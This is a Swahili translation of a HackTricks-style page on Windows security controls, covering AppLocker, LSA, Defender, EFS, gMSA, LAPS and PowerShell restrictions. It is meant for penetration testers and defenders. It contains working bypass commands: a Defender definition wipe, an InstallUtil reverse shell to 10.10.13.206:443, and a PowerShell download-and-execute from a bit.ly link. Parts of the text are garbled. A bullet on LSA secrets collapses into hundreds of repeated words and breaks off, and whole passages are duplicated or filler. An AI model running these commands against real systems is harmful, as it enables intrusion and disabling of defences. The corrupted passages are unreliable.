# Udhibiti wa Usalama wa Windows

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha mchakato** wa kazi zinazotumia zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Sera ya AppLocker

Orodha nyeupe ya programu ni orodha ya programu au faili za kutekelezwa zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kukimbia kwenye mfumo. Lengo ni kulinda mazingira kutokana na programu hasidi hatari na programu zisizoidhinishwa ambazo hazilingani na mahitaji maalum ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni suluhisho la **orodha nyeupe ya programu** la Microsoft na hutoa udhibiti kwa wasimamizi wa mfumo juu ya **programu na faili zipi watumiaji wanaweza kukimbia**. Inatoa **udhibiti wa kina** juu ya programu za kutekelezwa, hati za script, faili za Windows installer, DLLs, programu zilizopakwa, na wakala wa ufungaji wa programu zilizopakwa.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na ufikiaji wa kuandika kwenye saraka fulani, **lakini hii yote inaweza kuzungukwa**.

### Angalia

Angalia ni faili/nyongeza zipi zimezuiwa/kuruhusiwa:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya usajili ina maelezo na sera zinazotumiwa na AppLocker, ikitoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Kupitisha

* Folders za **kuandika** zinazofaa kwa kupitisha Sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **folders za kuandika** unazoweza kutumia kwa **kupitisha hii**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* **Kawaida** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries zinaweza pia kuwa na manufaa katika kuepuka AppLocker.
* **Sheria zilizoandikwa vibaya pia zinaweza kuepukwa**
* Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folda iliyoitwa `allowed`** mahali popote na itaruhusiwa.
* Mashirika mara nyingi pia huzingatia **kuzuia utekelezaji wa `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **eneo lingine** [**la utekelezaji wa PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
* **Utekelezaji wa DLL mara chache sana huwezeshwa** kutokana na mzigo ziada unaweza kuweka kwenye mfumo, na idadi ya majaribio yanayohitajika kuhakikisha hakuna kitu kitavunjika. Kwa hivyo kutumia **DLL kama mlango wa nyuma kutawasaidia kuepuka AppLocker**.
* Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kutekeleza **code ya Powershell** katika mchakato wowote na kuepuka AppLocker. Kwa habari zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Uhifadhi wa Vitambulisho

### Meneja wa Akaunti za Usalama (SAM)

Vitambulisho vya ndani vipo katika faili hii, nywila zimehifadhiwa kwa njia ya hash.

### Mamlaka ya Usalama ya Ndani (LSA) - LSASS

**Vitambulisho** (vilivyohashwa) vimehifadhiwa katika **kumbukumbu** ya mfumo huu kwa sababu za Single Sign-On.\
LSA inasimamia **sera za usalama** za ndani (sera ya nywila, ruhusa za watumiaji...), **uthibitishaji**, **vitambulisho vya ufikiaji**...\
LSA ndiye atakayefanya **uhakiki** wa vitambulisho vilivyotolewa ndani ya faili ya **SAM** (kwa kuingia ndani ya mfumo) na **kuwasiliana** na **kudhibitisha** mtumiaji wa kikoa kwenye kudhibiti kikoa.

**Vitambulisho** vimehifadhiwa ndani ya **mchakato wa LSASS**: tiketi za Kerberos, hash NT na LM, nywila zinazoweza kufutuliwa kwa urahisi.

### Siri za LSA

LSA inaweza kuhifadhi vitambulisho fulani kwenye diski:

* Nenosiri la akaunti ya kompyuta ya Active Directory (kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kudhibitiwa na kud
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Mfumo wa Faili Uliofichwa (EFS)

EFS inalinda faili kupitia kifunguo cha **symmetric key** kinachojulikana kama **File Encryption Key (FEK)**. Kifunguo hiki kinafichwa kwa kutumia **public key** ya mtumiaji na kuhifadhiwa ndani ya $EFS **alternative data stream** ya faili iliyofichwa. Wakati unahitaji kufanya ufichuzi, kifunguo cha siri kinacholingana na cheti cha dijiti cha mtumiaji hutumiwa kufichua FEK kutoka kwenye mtiririko wa $EFS. Maelezo zaidi yanaweza kupatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Hali za ufichuzi bila kuanzishwa na mtumiaji** ni pamoja na:

- Wakati faili au folda zinahamishwa kwenda mfumo wa faili usio wa EFS, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), zinafichuliwa moja kwa moja.
- Faili zilizofichwa zinazotumwa kupitia itifaki ya SMB/CIFS kwenye mtandao zinafichuliwa kabla ya uhamisho.

Njia hii ya ufichaji inaruhusu ufikiaji **bila kujulikana** kwa faili zilizofichwa kwa mmiliki. Walakini, kubadilisha tu nenosiri la mmiliki na kuingia halitawezesha ufichuzi.

**Mambo Muhimu**:
- EFS inatumia FEK ya symmetric, iliyofichwa kwa kutumia public key ya mtumiaji.
- Ufichuzi unatumia private key ya mtumiaji kufikia FEK.
- Ufichuzi wa moja kwa moja unatokea chini ya hali maalum, kama vile nakala kwenye FAT32 au uhamisho wa mtandao.
- Faili zilizofichwa zinapatikana kwa mmiliki bila hatua za ziada.

### Angalia Habari za EFS

Angalia ikiwa **mtumiaji** ame**tumia** **huduma** hii kwa kuangalia ikiwa njia hii ipo: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **upatikanaji** wa faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kuficha** na **kufichua** faili zote

### Kufichua Faili za EFS

#### Kuwa Mamlaka ya Mfumo

Njia hii inahitaji **mtumiaji wa mwathiriwa** kuwa **anafanya kazi** ndani ya mwenyeji. Ikiwa hivyo ndivyo, kwa kutumia kikao cha `meterpreter` unaweza kujifanya kuwa kitambulisho cha mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu `migrate` kwa mchakato wa mtumiaji.

#### Kujua nenosiri la mtumiaji

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Akaunti za Huduma za Kikundi (gMSA)

Microsoft iliendeleza **Akaunti za Huduma za Kikundi (gMSA)** ili kusimplify usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za huduma za kawaida ambazo mara nyingi zina chaguo la "**Password never expire**" kuwezeshwa, gMSAs hutoa suluhisho lenye usalama zaidi na linaloweza kusimamiwa:

- **Usimamizi wa Nenosiri Otomatiki**: gMSAs hutumia nenosiri lenye herufi 240 ambalo hujibadilisha moja kwa moja kulingana na sera ya kikoa au kompyuta. Mchakato huu unashughulikiwa na Huduma ya Usambazaji wa Ufunguo ya Microsoft (KDC), ikiondoa haja ya kusasisha nenosiri kwa mikono.
- **Usalama Ulioboreshwa**: Akaunti hizi hazina uwezo wa kufungwa na haziwezi kutumika kwa kuingia kwa njia ya kuingiliana, ikiboresha usalama wao.
- **Msaada wa Mwenyeji Mbalimbali**: gMSAs zinaweza kushirikiwa kwenye wenyewe wengi, zikiwa nzuri kwa huduma zinazofanya kazi kwenye seva nyingi.
- **Uwezo wa Kazi Zilizopangwa**: Tofauti na akaunti za huduma zilizosimamiwa, gMSAs zinasaidia kutekeleza kazi zilizopangwa.
- **Usimamizi Rahisi wa SPN**: Mfumo huo unasasisha moja kwa moja Jina la Mwanzo la Mkuu wa Huduma (SPN) wakati kuna mabadiliko kwenye maelezo ya sAMaccount ya kompyuta au jina la DNS, ikisimplify usimamizi wa SPN.

Nenosiri za gMSAs zimehifadhiwa kwenye mali ya LDAP _**msDS-ManagedPassword**_ na zinabadilishwa moja kwa moja kila baada ya siku 30 na Wadhibiti wa Kikoa (DCs). Nenosiri hili, kifurushi cha data kilichofichwa kinachojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kinaweza kupatikana tu na wasimamizi walioruhusiwa na seva ambazo gMSAs zimefungwa, ikihakikisha mazingira salama. Ili kupata habari hii, unahitaji kuwa na uhusiano salama kama LDAPS, au uhusiano lazima uwe umeathibitishwa na 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Unaweza kusoma nenosiri hili na [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[Pata habari zaidi katika chapisho hili](https://cube0x0.github.io/Relaying-for-gMSA/)**

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **shambulio la NTLM relay** ili **kusoma** **nenosiri** la **gMSA**.

## LAPS

**Local Administrator Password Solution (LAPS)**, inapatikana kwa kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), inawezesha usimamizi wa nywila za wasimamizi wa ndani. Nywila hizi, ambazo ni **za kubahatisha**, za kipekee, na **zina mabadiliko mara kwa mara**, zimehifadhiwa kwa kati katika Active Directory. Upatikanaji wa nywila hizi umefungwa kupitia ACLs kwa watumiaji walioruhusiwa. Kwa idhini ya kutosha iliyotolewa, uwezo wa kusoma nywila za wasimamizi wa ndani unapatikana.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **inazuia kwa kiasi kikubwa vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia vitu vya COM, kuruhusu aina za .NET zilizoidhinishwa tu, mifumo ya kazi ya XAML, darasa za PowerShell, na zaidi.

### **Angalia**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Kupita

Bypass ni mbinu ya kuepuka au kuzunguka hatua za usalama ili kupata ufikiaji usioidhinishwa au kufanya vitendo visivyoruhusiwa. Katika muktadha wa udukuzi, bypass inahusu kuepuka au kuzunguka hatua za usalama ili kupata ufikiaji usioidhinishwa kwenye mfumo au mtandao.

Kuna njia mbalimbali za kufanya bypass, kama vile:

- **Bypass ya Uthibitishaji**: Hii ni mbinu ya kuepuka hatua za uthibitishaji ili kupata ufikiaji usioidhinishwa kwenye mfumo au akaunti. Mifano ya bypass ya uthibitishaji ni pamoja na kuvunja nywila, kudukua akaunti, au kutumia mbinu za kijamii kama vile kuiba kitambulisho cha mtumiaji.

- **Bypass ya UAC**: UAC (User Account Control) ni kipengele cha usalama kinachopatikana kwenye mfumo wa Windows ambacho kinazuia programu zisizo na idhini ya kufanya mabadiliko kwenye mfumo. Bypass ya UAC inahusu kuzunguka au kuepuka hatua za UAC ili kupata ufikiaji usioidhinishwa kwenye mfumo.

- **Bypass ya EFS**: EFS (Encrypting File System) ni kipengele cha usalama kinachopatikana kwenye mfumo wa Windows ambacho kinaruhusu kuhifadhi faili kwa njia iliyosimbwa. Bypass ya EFS inahusu kuepuka au kuzunguka hatua za usalama za EFS ili kupata ufikiaji usioidhinishwa kwenye faili zilizosimbwa.

Kwa kuwa bypass inahusisha kuzunguka au kuepuka hatua za usalama, ni muhimu kwa wataalamu wa usalama kuelewa mbinu hizi ili kuzuia na kugundua udukuzi.
```powershell
#Easy bypass
Powershell -version 2
```
Katika Windows ya sasa, njia ya kudukua haitafanya kazi lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikusanya, unaweza kuhitaji** **kuongeza Marejeleo** -> Tafuta -> Tafuta -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **badilisha mradi kuwa .Net4.5**.

#### Kudukua moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Kitanzi cha nyuma:

A reverse shell is a type of shell in which the target machine initiates a connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. Reverse shells are commonly used in hacking scenarios to bypass firewalls and gain unauthorized access to systems.

To create a reverse shell, the attacker needs to set up a listener on their machine and then exploit a vulnerability on the target machine to establish a connection. Once the connection is established, the attacker can use the reverse shell to execute commands on the target machine as if they were sitting in front of it.

Reverse shells can be created using various techniques, such as exploiting vulnerable services, injecting malicious code into legitimate processes, or using tools specifically designed for creating reverse shells. It is important for system administrators to be aware of the risks associated with reverse shells and take appropriate measures to protect their systems from such attacks.

#### Kitanzi cha nyuma:

Kitanzi cha nyuma ni aina ya kitanzi ambapo kifaa cha lengo kinainisha uhusiano na kifaa cha mshambuliaji. Hii inaruhusu mshambuliaji kupata ufikiaji wa kijijini kwa kifaa cha lengo na kutekeleza amri. Kitanzi cha nyuma mara nyingi hutumiwa katika mazingira ya udukuzi ili kuepuka firewalls na kupata ufikiaji usiohalali kwa mifumo.

Ili kuunda kitanzi cha nyuma, mshambuliaji anahitaji kuweka msikilizaji kwenye kifaa chao na kisha kutumia udhaifu kwenye kifaa cha lengo ili kuweka uhusiano. Mara uhusiano unapowekwa, mshambuliaji anaweza kutumia kitanzi cha nyuma kuendesha amri kwenye kifaa cha lengo kana kwamba wako mbele yake.

Kitanzi cha nyuma kinaweza kuundwa kwa kutumia njia mbalimbali, kama vile kutumia huduma zenye udhaifu, kuingiza nambari mbaya kwenye michakato halali, au kutumia zana zilizoundwa kwa ajili ya kuunda kitanzi cha nyuma. Ni muhimu kwa watawala wa mfumo kufahamu hatari zinazohusiana na kitanzi cha nyuma na kuchukua hatua sahihi za kulinda mifumo yao kutokana na mashambulizi kama hayo.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kutekeleza kificho cha **Powershell** katika mchakato wowote na kuepuka hali iliyozuiwa. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi, imewekwa kama **iliyozuiwa.** Njia kuu za kuepuka sera hii ni:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Unaweza kupata zaidi [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Kiolesura cha Msaada cha Mtoaji wa Usalama (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI itakuwa na jukumu la kupata itifaki inayofaa kwa ajili ya mawasiliano kati ya mashine mbili. Njia iliyopendekezwa kwa hili ni Kerberos. Kisha SSPI itafanya mazungumzo kuhusu itifaki ya kuthibitisha itakayotumika, itifaki hizi za kuthibitisha huitwa Mtoaji wa Msaada wa Usalama (SSP), zinapatikana ndani ya kila mashine ya Windows kwa mfumo wa DLL na mashine zote lazima ziwe na mtoaji huo huo ili ziweze kuwasiliana.

### SSPs Kuu

* **Kerberos**: Inayopendelewa
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** na **NTLMv2**: Kwa sababu za utangamano
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Seva za wavuti na LDAP, nenosiri kwa mfumo wa hash ya MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL na TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Hutumika kufanya mazungumzo kuhusu itifaki itakayotumika (Kerberos au NTLM, huku Kerberos ikiwa chaguo msingi)
* %windir%\Windows\System32\lsasrv.dll

#### Mazungumzo yanaweza kutoa njia kadhaa au moja tu.

## UAC - Udhibiti wa Akaunti ya Mtumiaji

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kibali cha idhini kwa shughuli zilizoongezeka**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mchakato wa kiotomatiki** uliofanywa na zana za jamii za **hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
